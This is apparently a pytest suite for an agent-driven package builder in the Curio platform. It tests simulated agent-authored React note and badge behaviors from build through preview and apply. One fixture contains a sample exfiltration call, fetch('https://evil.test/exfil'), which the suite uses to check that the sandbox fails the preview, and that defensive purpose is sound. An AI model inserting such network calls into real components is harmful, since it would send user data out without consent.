"""The dev/90 DOD regression: PROMPT-DRIVEN custom looks, end to end.

Every behavior source in this file is TEST-LOCAL DATA simulating a model's
output (dev/90 §3 "tests own their scenarios") — nothing here ships as
first-party code, and two visually dissimilar looks (post-it, status badge)
prove the stack is look-agnostic. The recorded route-level scenario drives
the corrected dev/90 topology: the Researcher delegates authoring with the
post-it requirements, the Package Builder child returns a draft, the runtime
mints the reviewed proposal, and Apply lands colored notes.

Visual baselines note: the pinned preview runner is deployment infrastructure
(CURIO_BUILD_PREVIEW_RUNNER); these tests drive the preview CONTRACT (five
states, per-state screenshots, registration) through the deterministic fake
harness — approved pixel baselines live with the operator's runner, not here.
"""

from __future__ import annotations

import io
import json
import zipfile

import pytest

from utk_curio.backend.app.packages import build_jobs, build_promotion, build_staging
from utk_curio.backend.app.packages.build_extension import installed_package_digest
from utk_curio.backend.app.packages.build_models import parse_build_request
from utk_curio.backend.app.packages.build_pipeline import run_build
from utk_curio.backend.app.packages.build_preview import PREVIEW_STATES
from utk_curio.backend.app.packages.node_appearance import NAMED_COLORS
from utk_curio.backend.tests.test_packages.test_build_compiler import _FAKE_ESBUILD
from utk_curio.backend.tests.test_packages.test_build_preview import _FAKE_RUNNER

# ── scenario sources: SIMULATED MODEL OUTPUT, never product code ──────────

_POSTIT_TSX = """\
// simulated agent-authored behavior (test data — dev/90)
import React from "react";
const PALETTE = {yellow: "#fef3c0", pink: "#fbd3e0", blue: "#cfe8f7"};
function Note({ data }) {
  const bg = (data && data.appearance && data.appearance.backgroundColor) || PALETTE.yellow;
  const text = typeof (data && data.code) === "string" ? data.code : "";
  return React.createElement("div",
    { role: "note", style: { width: 260, minHeight: 240, maxHeight: 340,
      overflowY: "auto", background: bg, color: "#1f2430", padding: 10 } },
    text.trim() ? text : "Nothing here yet.");
}
window.curio.registerBehavior("postit-note",
  (data) => ({ contentComponent: React.createElement(Note, { data }) }));
"""

_BADGE_TSX = """\
// simulated agent-authored behavior (test data — dev/90): a DISSIMILAR look
import React from "react";
function Badge({ data }) {
  const label = typeof (data && data.code) === "string" ? data.code : "?";
  return React.createElement("div",
    { role: "status", style: { width: 120, height: 120, borderRadius: "50%",
      display: "flex", alignItems: "center", justifyContent: "center",
      background: "#1f2430", color: "#ffffff", fontWeight: 700 } },
    label.slice(0, 12));
}
window.curio.registerBehavior("status-badge",
  (data) => ({ contentComponent: React.createElement(Badge, { data }) }));
"""

# A behavior that reaches for the network: in the real preview document the
# sandbox thrower fires and lands in consoleErrors; the fake harness reports
# the same outcome through its marker. Either way: preview fails, never applies.
_VIOLATING_TSX = """\
// simulated agent-authored behavior (test data — dev/90) //CONSOLE-ERROR
import React from "react";
fetch("https://evil.test/exfil");
window.curio.registerBehavior("postit-note",
  () => ({ contentComponent: React.createElement("div") }));
"""


def _template(template_id: str, behavior: str) -> dict:
    return {
        "id": template_id, "label": template_id, "category": "visualization",
        "engine": "javascript", "editor": "none", "behavior": behavior,
        "hasCode": False, "hasWidgets": False, "hasGrammar": False,
        "inputPorts": [], "outputPorts": [],
    }


def _scenario(*, package_id: str, template_id: str, behavior: str, source: str,
              notes: list[dict] | None = None) -> dict:
    return {
        "mode": "create",
        "target": f"{package_id}@1",
        "manifest": {
            "id": package_id, "version": "1.0.0", "name": package_id,
            "publisher": "Agent", "description": "agent-authored look",
            "license": "MIT",
            "compatibility": {"curioRuntime": ">=0.5.0", "major": 1},
            "permissions": [],
            "dependencies": {"packages": {}, "python": {}, "js": {}},
            "templates": [_template(template_id, behavior)],
        },
        "files": {f"sources/{template_id}.tsx": {"text": source}},
        "behaviorEntries": [f"sources/{template_id}.tsx"],
        "previewTemplates": [template_id],
        "nodes": notes or [],
    }


def _postit_scenario(notes=None) -> dict:
    return _scenario(package_id="ai.agent.postit", template_id="postit-note",
                     behavior="postit-note", source=_POSTIT_TSX, notes=notes)


def _badge_scenario() -> dict:
    return _scenario(package_id="ai.agent.badges", template_id="status-badge",
                     behavior="status-badge", source=_BADGE_TSX)


def _violating_scenario() -> dict:
    return _scenario(package_id="ai.agent.leaky", template_id="postit-note",
                     behavior="postit-note", source=_VIOLATING_TSX)


_NOTES = [
    {"templateId": "postit-note", "title": "Transit findings", "content": "# Findings",
     "appearance": {"backgroundColor": "pink"}},
    {"templateId": "postit-note", "title": "Zoning summary", "content": "Mixed-use +12%",
     "appearance": {"backgroundColor": "lavender"}},
    {"templateId": "postit-note", "title": "Custom color", "content": "Deep dive",
     "appearance": {"backgroundColor": "#336699"}},
]


@pytest.fixture(autouse=True)
def _fresh_jobs():
    build_jobs.reset_registry()
    yield
    build_jobs.reset_registry()


@pytest.fixture()
def pinned_tools(tmp_path, monkeypatch):
    esbuild = tmp_path / "fake-esbuild"
    esbuild.write_text(_FAKE_ESBUILD, encoding="utf-8")
    esbuild.chmod(0o755)
    runner = tmp_path / "fake-preview-runner"
    runner.write_text(_FAKE_RUNNER, encoding="utf-8")
    runner.chmod(0o755)
    monkeypatch.setenv("CURIO_BUILD_ESBUILD", str(esbuild))
    monkeypatch.setenv("CURIO_BUILD_PREVIEW_RUNNER", str(runner))


class TestScenarioDrafts:
    def test_postit_draft_is_presentation_only(self):
        request = parse_build_request(_postit_scenario(_NOTES))
        template = request.manifest["templates"][0]
        assert template["engine"] == "javascript" and template["editor"] == "none"
        assert template["hasCode"] is False
        assert template["inputPorts"] == [] and template["outputPorts"] == []
        assert request.manifest["dependencies"] == {"packages": {}, "python": {}, "js": {}}
        colors = [n.appearance["backgroundColor"] for n in request.nodes]
        assert colors == [NAMED_COLORS["pink"], NAMED_COLORS["lavender"], "#336699"]

    def test_invalid_note_color_refuses(self):
        from utk_curio.backend.app.packages.build_models import BuildRequestError

        bad = _postit_scenario([{"templateId": "postit-note", "content": "x",
                                 "appearance": {"backgroundColor": "#777777"}}])
        with pytest.raises(BuildRequestError, match="appearance"):
            parse_build_request(bad)


class TestLookAgnosticPipeline:
    def _build_ready(self, params):
        job = run_build("guest", parse_build_request(params))
        assert job.phase == "ready", job.to_payload()
        return job.result

    def test_postit_scenario_end_to_end(self, tmp_curio, pinned_tools):
        from utk_curio.backend.app.packages.storage import package_dir

        result = self._build_ready(_postit_scenario(_NOTES))
        archive = build_staging.read_artifact("guest", result.artifact_digest)
        with zipfile.ZipFile(io.BytesIO(archive)) as zf:
            manifest = json.loads(zf.read("manifest.json"))
            bundle = zf.read("scripts/behaviors.js")
        assert manifest["behaviorScript"] == "scripts/behaviors.js"
        assert manifest["dependencies"]["python"] == {}  # never the sandbox
        assert b"postit-note" in bundle
        assert b"alias:react" in bundle  # host singletons stay external
        preview = result.preview
        assert preview["status"] == "ok"
        assert set(preview["states"]["postit-note"]) == set(PREVIEW_STATES)
        for state in PREVIEW_STATES:
            assert preview["screenshots"][f"postit-note/{state}"]["bytes"] > 0
        journal = build_promotion.promote(
            "guest", target="ai.agent.postit@1",
            artifact_digest=result.artifact_digest)
        assert journal["status"] == "awaiting-activation"
        assert (package_dir("guest", "ai.agent.postit@1")
                / "scripts" / "behaviors.js").is_file()

    def test_dissimilar_badge_scenario_also_lands(self, tmp_curio, pinned_tools):
        # Look-agnosticism: a circular status badge rides the SAME stack with
        # zero special-casing — nothing about the pipeline knows "post-it".
        result = self._build_ready(_badge_scenario())
        assert result.preview["registered"]["status-badge"] == ["status-badge"]
        archive = build_staging.read_artifact("guest", result.artifact_digest)
        with zipfile.ZipFile(io.BytesIO(archive)) as zf:
            assert b"status-badge" in zf.read("scripts/behaviors.js")

    def test_violating_scenario_fails_preview_and_never_applies(
            self, tmp_curio, pinned_tools):
        job = run_build("guest", parse_build_request(_violating_scenario()))
        assert job.phase == "failed"
        assert job.result is not None and job.result.status == "failed"
        assert any("preview failed" in w for w in job.result.warnings)
        assert job.result.artifact_digest is None  # nothing staged to promote

    def test_recolor_never_rebuilds(self, tmp_curio, pinned_tools):
        result = self._build_ready(_postit_scenario(_NOTES[:1]))
        build_promotion.promote("guest", target="ai.agent.postit@1",
                                artifact_digest=result.artifact_digest)
        before = installed_package_digest("guest", "ai.agent.postit@1")
        # A recolor is a spec/canvas edit; the installed bytes never change.
        assert installed_package_digest("guest", "ai.agent.postit@1") == before

    def test_one_template_many_independent_colors(self):
        request = parse_build_request(_postit_scenario(_NOTES))
        assert len({n.appearance["backgroundColor"] for n in request.nodes}) == 3
        assert {n.template_id for n in request.nodes} == {"postit-note"}


class TestDodThroughTheResearcher:
    """The recorded dev/90 scenario: Researcher delegates the post-it
    requirements → the Package Builder child returns the draft → the runtime
    mints the reviewed proposal → Apply installs and creates colored notes."""

    RESEARCHER = "agent.researcher@1.0.0"
    PACKAGE_BUILDER = "agent.package-builder@1.0.0"

    def _auth(self, token):
        return {"Authorization": f"Bearer {token}"}

    def test_recorded_scenario(self, client, user_and_token, tmp_curio,
                               pinned_tools, monkeypatch):
        from utk_curio.backend.app.projects import storage as projects_storage
        from utk_curio.backend.app.projects.services import _user_dir_key

        user, token = user_and_token
        pid = client.post("/api/projects", json={
            "name": "dod",
            "spec": {"dataflow": {"nodes": [], "edges": [], "packages": []}},
            "outputs": [],
        }, headers=self._auth(token)).get_json()["id"]
        for coord in (self.RESEARCHER, self.PACKAGE_BUILDER):
            client.post(f"/api/agents/projects/{pid}/install",
                        json={"coord": coord}, headers=self._auth(token))
        att_id = client.post(
            f"/api/agents/projects/{pid}/attachments",
            json={"coord": self.RESEARCHER, "target": {"kind": "canvas"}},
            headers=self._auth(token),
        ).get_json()["attachmentId"]

        delegate_tail = (
            '```curio.v1\n{"delegateRequest": {"capability": "node.kind.author", '
            '"inputs": {"look": "post-it notes", "colors": ["pink", "lavender", '
            '"#336699"]}}}\n```'
        )
        child_reply = ("```json\n"
                       + json.dumps({"packageDraft": _postit_scenario(_NOTES)})
                       + "\n```")
        replies = [delegate_tail, child_reply, "Proposed — review the draft above."]
        calls: list = []

        def _fake_run(config, messages, **kwargs):
            from utk_curio.backend.app.agents import services as services_mod

            if messages and messages[0].get("content") == services_mod.TITLE_PROMPT:
                return "Title"
            calls.append(messages)
            return replies[min(len(calls) - 1, len(replies) - 1)]

        monkeypatch.setattr(
            "utk_curio.backend.app.agents.services.run_chat_completion", _fake_run)

        run = client.post(
            f"/api/agents/projects/{pid}/attachments/{att_id}/run",
            json={"message": "turn my findings into post-it notes"},
            headers=self._auth(token),
        )
        assert run.status_code == 200, run.get_data(as_text=True)
        parts = run.get_json()["content"]
        proposal = next(p for p in parts if p["type"] == "proposal")
        assert proposal["tool"] == "package.draft.apply"
        assert proposal["pins"]["target"] == "ai.agent.postit@1"

        resp = client.post(
            f"/api/agents/projects/{pid}/attachments/{att_id}"
            f"/proposals/{proposal['proposalId']}/apply",
            headers=self._auth(token),
        )
        assert resp.status_code == 200, resp.get_data(as_text=True)
        body = resp.get_json()
        assert body["requiresRegistryRefresh"] is True
        created = body["createdNodes"]
        assert [n["metadata"]["appearance"]["backgroundColor"] for n in created] == [
            NAMED_COLORS["pink"], NAMED_COLORS["lavender"], "#336699"]

        with client.application.app_context():
            user_key = _user_dir_key(user)
        spec = projects_storage.read_spec(user_key, pid)
        nodes = {n["title"]: n for n in spec["dataflow"]["nodes"]}
        assert nodes["Transit findings"]["metadata"]["appearance"] == {
            "backgroundColor": NAMED_COLORS["pink"]}
        assert nodes["Custom color"]["metadata"]["appearance"] == {
            "backgroundColor": "#336699"}


class TestWeatherInParisScenario:
    """dev/90 A1 — the reference recording's full loop: 'what's the weather
    in Paris?' → web.search (mocked provider) → the finding delegated with
    the post-it requirements → runtime-minted draft → Apply → a colored note
    carrying the weather text and its source link."""

    RESEARCHER = "agent.researcher@1.0.0"
    PACKAGE_BUILDER = "agent.package-builder@1.0.0"

    def _auth(self, token):
        return {"Authorization": f"Bearer {token}"}

    def test_recorded_video_scenario(self, client, user_and_token, tmp_curio,
                                     pinned_tools, monkeypatch):
        from utk_curio.backend.app.agents import egress
        from utk_curio.backend.app.agents.egress import EgressResult
        from utk_curio.backend.app.projects import storage as projects_storage
        from utk_curio.backend.app.projects.services import _user_dir_key

        # A configured search provider whose (mocked) egress returns rows.
        monkeypatch.setenv("CURIO_SEARCH_URL", "https://search.test/?q={q}")
        monkeypatch.setattr(egress, "fetch", lambda url, **kw: EgressResult(
            url=url, final_url=url, status=200, content_type="application/json",
            body=json.dumps({"results": [{
                "title": "Paris weather now",
                "url": "https://weather.test/paris",
                "snippet": "18°C, partly cloudy, light breeze",
            }]}),
        ))

        user, token = user_and_token
        pid = client.post("/api/projects", json={
            "name": "paris",
            "spec": {"dataflow": {"nodes": [], "edges": [], "packages": []}},
            "outputs": [],
        }, headers=self._auth(token)).get_json()["id"]
        for coord in (self.RESEARCHER, self.PACKAGE_BUILDER):
            client.post(f"/api/agents/projects/{pid}/install",
                        json={"coord": coord}, headers=self._auth(token))
        att_id = client.post(
            f"/api/agents/projects/{pid}/attachments",
            json={"coord": self.RESEARCHER, "target": {"kind": "canvas"}},
            headers=self._auth(token),
        ).get_json()["attachmentId"]

        # dev/90 A13 — the recording's row: yellow QUESTION note first,
        # then the green ANSWER note with markdown-composed content.
        weather_note = [{
            "templateId": "postit-note", "title": "Question",
            "content": "What's the weather in Paris?",
            "appearance": {"backgroundColor": "yellow"},
        }, {
            "templateId": "postit-note", "title": "Weather in Paris",
            "content": ("**Now:** 18°C, partly cloudy\n"
                        "- light breeze\n"
                        "- [source](https://weather.test/paris)"),
            "appearance": {"backgroundColor": "green"},
        }]
        replies = [
            # Round 1: the Researcher searches the internet first.
            '```curio.v1\n{"toolRequest": {"tool": "web.search", '
            '"params": {"q": "weather in Paris now"}}}\n```',
            # Round 2: findings in hand, it delegates authoring with the look.
            '```curio.v1\n{"delegateRequest": {"capability": "node.kind.author", '
            '"inputs": {"look": "post-it note", "finding": '
            '"Paris: 18\\u00b0C, partly cloudy", '
            '"source": "https://weather.test/paris"}}}\n```',
            # The CHILD (Package Builder) returns the draft with the note.
            "```json\n" + json.dumps(
                {"packageDraft": _postit_scenario(weather_note)}) + "\n```",
            # Round 3: the Researcher's visible answer.
            "Paris is 18°C and partly cloudy — the note above awaits your review.",
        ]
        calls: list = []

        def _fake_run(config, messages, **kwargs):
            from utk_curio.backend.app.agents import services as services_mod

            if messages and messages[0].get("content") == services_mod.TITLE_PROMPT:
                return "Title"
            calls.append(messages)
            return replies[min(len(calls) - 1, len(replies) - 1)]

        monkeypatch.setattr(
            "utk_curio.backend.app.agents.services.run_chat_completion", _fake_run)

        run = client.post(
            f"/api/agents/projects/{pid}/attachments/{att_id}/run",
            json={"message": "what's the weather in Paris?"},
            headers=self._auth(token),
        )
        assert run.status_code == 200, run.get_data(as_text=True)

        # The search result — including the source URL — reached the model
        # BEFORE the authoring delegation (gather-first, never from memory).
        # calls[] entries reference the parent's one mutated message list, so
        # read the final transcript and assert ordering.
        transcript = [m["content"] for m in calls[-1]
                      if isinstance(m.get("content"), str)]
        search_idx = next(i for i, c in enumerate(transcript)
                          if "[tool result] web.search: ok" in c)
        assert "weather.test/paris" in transcript[search_idx]
        assert "partly cloudy" in transcript[search_idx]
        delegate_idx = next(i for i, c in enumerate(transcript)
                            if "[delegate result]" in c)
        assert search_idx < delegate_idx

        parts = run.get_json()["content"]
        proposal = next(p for p in parts if p["type"] == "proposal")
        assert proposal["tool"] == "package.draft.apply"

        resp = client.post(
            f"/api/agents/projects/{pid}/attachments/{att_id}"
            f"/proposals/{proposal['proposalId']}/apply",
            headers=self._auth(token),
        )
        assert resp.status_code == 200, resp.get_data(as_text=True)
        with client.application.app_context():
            user_key = _user_dir_key(user)
        spec = projects_storage.read_spec(user_key, pid)
        nodes = {n.get("title"): n for n in spec["dataflow"]["nodes"]}
        # The recording's row, in order: yellow question note, then the green
        # markdown-composed answer note carrying the finding + source link.
        question = nodes["Question"]
        assert question["content"] == "What's the weather in Paris?"
        assert question["metadata"]["appearance"]["backgroundColor"] == NAMED_COLORS["yellow"]
        answer = nodes["Weather in Paris"]
        assert "**Now:**" in answer["content"]  # markdown-composed, not prose
        assert "- [source](https://weather.test/paris)" in answer["content"]
        assert answer["metadata"]["appearance"]["backgroundColor"] == NAMED_COLORS["green"]
        ordered = [n.get("title") for n in spec["dataflow"]["nodes"]
                   if n.get("title") in ("Question", "Weather in Paris")]
        assert ordered == ["Question", "Weather in Paris"]  # question FIRST


_CURIO_NOTES_TSX = """\
// simulated agent-authored behavior (test data — dev/90 A5): the corrected
// curio-notes retry — dependency-free markdown-lite instead of react-markdown
import React from "react";
function renderLite(text) {
  return String(text || "").split(/\\r?\\n/).map((line, i) => {
    if (/^#\\s+/.test(line)) return React.createElement("h4", { key: i }, line.slice(2));
    if (/^-\\s+/.test(line)) return React.createElement("li", { key: i }, line.slice(2));
    return line.trim() ? React.createElement("p", { key: i }, line) : null;
  });
}
function NoteBody({ data }) {
  const bg = (data && data.appearance && data.appearance.backgroundColor) || "#fef3c0";
  return React.createElement("div",
    { role: "note", style: { background: bg, color: "#1f2430", padding: 8 } },
    renderLite(data && data.code));
}
window.curio.registerBehavior("note-behavior",
  (data) => ({ contentComponent: React.createElement(NoteBody, { data }) }));
"""


class TestCurioNotesRetry:
    """dev/90 A4+A5 — the live transcript's request, corrected and replayed:
    reverse-DNS id (curio.notes), NO target (derived), NO react-markdown
    (self-contained markdown-lite), through mint → build → preview → Apply
    at the Package Builder's own attachment, exactly the failed live flow."""

    COORD = "agent.package-builder@1.0.0"

    def _auth(self, token):
        return {"Authorization": f"Bearer {token}"}

    def test_corrected_request_lands_end_to_end(self, client, user_and_token,
                                                tmp_curio, pinned_tools, monkeypatch):
        from utk_curio.backend.app.projects import storage as projects_storage
        from utk_curio.backend.app.projects.services import _user_dir_key

        user, token = user_and_token
        pid = client.post("/api/projects", json={
            "name": "notes",
            "spec": {"dataflow": {"nodes": [], "edges": [], "packages": []}},
            "outputs": [],
        }, headers=self._auth(token)).get_json()["id"]
        client.post(f"/api/agents/projects/{pid}/install",
                    json={"coord": self.COORD}, headers=self._auth(token))
        att_id = client.post(
            f"/api/agents/projects/{pid}/attachments",
            json={"coord": self.COORD, "target": {"kind": "canvas"}},
            headers=self._auth(token),
        ).get_json()["attachmentId"]

        params = _scenario(package_id="curio.notes", template_id="note",
                           behavior="note-behavior", source=_CURIO_NOTES_TSX,
                           notes=[{"templateId": "note", "title": "Docs note",
                                   "content": "# Pipeline\n- loads GTFS\n- joins zones",
                                   "appearance": {"backgroundColor": "blue"}}])
        params.pop("target")  # A4: identity is manifest.id@major
        assert params["manifest"]["dependencies"]["js"] == {}  # A5: zero deps
        tail = ("```curio.v1\n" + json.dumps(
            {"toolRequest": {"tool": "package.draft.apply", "params": params}}) + "\n```")
        replies = [tail, "Proposed — review the curio-notes draft above."]
        calls: list = []

        def _fake_run(config, messages, **kwargs):
            from utk_curio.backend.app.agents import services as services_mod

            if messages and messages[0].get("content") == services_mod.TITLE_PROMPT:
                return "Title"
            calls.append(messages)
            return replies[min(len(calls) - 1, len(replies) - 1)]

        monkeypatch.setattr(
            "utk_curio.backend.app.agents.services.run_chat_completion", _fake_run)

        run = client.post(
            f"/api/agents/projects/{pid}/attachments/{att_id}/run",
            json={"message": "create the curio-notes package"},
            headers=self._auth(token),
        )
        assert run.status_code == 200, run.get_data(as_text=True)
        proposal = next(p for p in run.get_json()["content"] if p["type"] == "proposal")
        assert proposal["pins"]["target"] == "curio.notes@1"  # derived, valid

        resp = client.post(
            f"/api/agents/projects/{pid}/attachments/{att_id}"
            f"/proposals/{proposal['proposalId']}/apply",
            headers=self._auth(token),
        )
        assert resp.status_code == 200, resp.get_data(as_text=True)
        body = resp.get_json()
        assert body["installedPackage"]["dirName"] == "curio.notes@1"
        with client.application.app_context():
            user_key = _user_dir_key(user)
        spec = projects_storage.read_spec(user_key, pid)
        note = next(n for n in spec["dataflow"]["nodes"] if n.get("title") == "Docs note")
        assert note["type"] == "curio.notes/note@1"
        assert note["metadata"]["appearance"]["backgroundColor"] == NAMED_COLORS["blue"]
